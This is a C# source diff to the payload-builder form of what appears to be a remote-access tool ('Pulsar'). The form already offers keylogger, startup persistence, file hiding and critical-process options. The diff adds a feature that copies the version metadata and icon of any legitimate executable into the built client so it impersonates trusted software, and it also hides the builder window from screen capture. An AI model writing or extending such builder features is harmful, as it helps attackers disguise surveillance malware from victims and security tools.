@@ -6,6 +6,7 @@ using Pulsar.Server.Models;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -31,10 +32,11 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);            
 
             txtHost.TextChanged += txtHost_TextChanged;
             txtHost.KeyDown += TxtHost_KeyDown;
+            txtIconPath.TextChanged += TxtIconPath_TextChanged;
 
             lblPortNotification = new Label();
             lblPortNotification.AutoSize = true;
@@ -200,9 +202,10 @@ namespace Pulsar.Server.Forms
             chkHide.Checked = profile.HideFile;
             chkHideSubDirectory.Checked = profile.HideSubDirectory;
             chkStartup.Checked = profile.AddStartup;
-            txtRegistryKeyName.Text = profile.RegistryName;
+            txtRegistryKeyName.Text = profile.RegistryName;            
             chkChangeIcon.Checked = profile.ChangeIcon;
             txtIconPath.Text = profile.IconPath;
+            LoadIconPreview(profile.IconPath);
             chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
             chkKeylogger.Checked = profile.Keylogger;
             txtLogDirectoryName.Text = profile.LogDirectoryName;
@@ -409,8 +412,8 @@ namespace Pulsar.Server.Forms
         private void chkCriticalProcess_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
-        }
-
+        }        
+        
         private void btnBrowseIcon_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog ofd = new OpenFileDialog())
@@ -421,7 +424,7 @@ namespace Pulsar.Server.Forms
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
                     txtIconPath.Text = ofd.FileName;
-                    iconPreview.Image = Bitmap.FromHicon(new Icon(ofd.FileName, new Size(64, 64)).Handle);
+                    LoadIconPreview(ofd.FileName);
                 }
             }
         }
@@ -712,7 +715,7 @@ namespace Pulsar.Server.Forms
 
         private bool IsValidVersionNumber(string input)
         {
-            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
+            Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+(\.[0-9]+)?(\.[0-9]+)?$", RegexOptions.IgnoreCase);
             return match.Success;
         }
 
@@ -749,12 +752,22 @@ namespace Pulsar.Server.Forms
             txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
             txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
             txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
-        }
-
-        private void UpdateIconControlStates()
+        }        private void UpdateIconControlStates()
         {
             txtIconPath.Enabled = chkChangeIcon.Checked;
             btnBrowseIcon.Enabled = chkChangeIcon.Checked;
+            
+            // Clear icon preview when disabled
+            if (!chkChangeIcon.Checked)
+            {
+                iconPreview.Image?.Dispose();
+                iconPreview.Image = null;
+            }
+            else
+            {
+                // Load preview if path exists when enabled
+                LoadIconPreview(txtIconPath.Text);
+            }
         }
 
         private void UpdateStartupControlStates()
@@ -821,6 +834,160 @@ namespace Pulsar.Server.Forms
         private void txtPastebin_TextChanged(object sender, EventArgs e)
         {
 
+        }
+
+        private void btnClone_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Title = "Select executable to clone settings from";
+                ofd.Filter = "Executable files (*.exe)|*.exe";
+                ofd.Multiselect = false;
+
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    try
+                    {
+                        FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(ofd.FileName);
+
+                        txtProductName.Text = versionInfo.ProductName ?? "";
+                        txtDescription.Text = versionInfo.FileDescription ?? "";
+                        txtCompanyName.Text = versionInfo.CompanyName ?? "";
+                        txtCopyright.Text = versionInfo.LegalCopyright ?? "";
+                        txtTrademarks.Text = versionInfo.LegalTrademarks ?? "";
+                        txtOriginalFilename.Text = versionInfo.OriginalFilename ?? "";
+
+                        string productVer = versionInfo.ProductVersion ?? "1.0.0.0";
+                        string fileVer = versionInfo.FileVersion ?? "1.0.0.0";
+
+                        txtProductVersion.Text = CleanVersionNumber(productVer);
+                        txtFileVersion.Text = CleanVersionNumber(fileVer);
+
+                        chkChangeAsmInfo.Checked = true;
+
+                        try
+                        {
+                            string tempIconPath = Path.Combine(Path.GetTempPath(), $"{Path.GetFileNameWithoutExtension(ofd.FileName)}_{Guid.NewGuid()}.ico");
+                            Icon iconextracted = Icon.ExtractAssociatedIcon(ofd.FileName);
+                            
+                            Bitmap bitmap = iconextracted.ToBitmap();
+                            bitmap.Save("out.bmp");
+
+                            SaveBitmapAsIcon(bitmap, tempIconPath);
+
+                            txtIconPath.Text = tempIconPath;
+                            LoadIconPreview(tempIconPath);
+
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show($"Could not extract icon: {ex.Message}", "Icon Extraction Error",
+                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        }
+
+                        MessageBox.Show($"Successfully cloned settings from {Path.GetFileName(ofd.FileName)}",
+                            "Clone Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                        HasChanged();
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show($"Error cloning settings: {ex.Message}", "Clone Failed",
+                            MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
+                }
+            }
+        }
+
+        private string CleanVersionNumber(string version)
+        {
+            string cleaned = string.Join(".", version.Split('.', ' ')
+                .Where(s => !string.IsNullOrWhiteSpace(s) && s.Any(char.IsDigit))
+                .Select(s => string.Join("", s.Where(char.IsDigit))));
+
+            string[] parts = cleaned.Split('.');
+            if (parts.Length == 0)
+                return "1.0";
+            else if (parts.Length == 1)
+                return parts[0] + ".0";
+
+            return cleaned;
+        }
+
+        // THIS IS MADE BY CHATGPT BECAUSE WHY TF DOES .NET NOT HAVE ICONS KEEP THEIR TRANSPARENCY WHEN SAVING THEM AS .ICO FILES?!
+        // YOU NEED TO CONVERT IT TO A BITMAP TO PRESERVE THE ALPHA CHANNEL THEN CONVERT THAT BMP BACK TO AN ICO :sob:
+        public static void SaveBitmapAsIcon(Bitmap bitmap, string filename)
+        {
+            using (var fs = new FileStream(filename, FileMode.Create))
+            {
+                // Write ICONDIR structure
+                fs.Write(new byte[] {
+                0, 0,   // Reserved
+                1, 0,   // Type: 1 = icon
+                1, 0    // Count: 1 image
+            }, 0, 6);
+
+                // ICONDIR structure: width, height, colors, reserved, planes, bitcount, size, offset
+                byte width = (byte)(bitmap.Width >= 256 ? 0 : bitmap.Width); // 0 means 256
+                byte height = (byte)(bitmap.Height >= 256 ? 0 : bitmap.Height); // 0 means 256
+
+                using (var imageStream = new MemoryStream())
+                {
+                    // Save bitmap as PNG inside the .ico (modern format with alpha)
+                    bitmap.Save(imageStream, System.Drawing.Imaging.ImageFormat.Png);
+                    byte[] pngData = imageStream.ToArray();
+
+                    fs.Write(new byte[] {
+                    width,
+                    height,
+                    0,        // Color count
+                    0,        // Reserved
+                    1, 0,     // Color planes
+                    32, 0     // Bits per pixel
+                }, 0, 8);
+
+                    fs.Write(BitConverter.GetBytes(pngData.Length), 0, 4);  // Size of image data
+                    fs.Write(BitConverter.GetBytes(22), 0, 4);              // Offset of image data
+
+                    fs.Write(pngData, 0, pngData.Length);                   // Write PNG data
+                }
+            }
+        }
+
+        /// <summary>
+        /// Loads and displays an icon preview with proper transparency handling
+        /// </summary>
+        /// <param name="iconPath">Path to the icon file</param>
+        private void LoadIconPreview(string iconPath)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(iconPath) || !File.Exists(iconPath))
+                {
+                    iconPreview.Image?.Dispose();
+                    iconPreview.Image = null;
+                    return;
+                }
+
+                iconPreview.Image?.Dispose();
+
+                using (Icon icon = new Icon(iconPath, new Size(64, 64)))
+                {
+                    iconPreview.Image = icon.ToBitmap();
+                }
+            }
+            catch (Exception ex)
+            {
+                iconPreview.Image?.Dispose();
+                iconPreview.Image = null;
+                Debug.WriteLine($"Error loading icon preview: {ex.Message}");
+            }
+        }
+
+        private void TxtIconPath_TextChanged(object sender, EventArgs e)
+        {
+            LoadIconPreview(txtIconPath.Text);
+            HasChanged();
         }
     }
 }
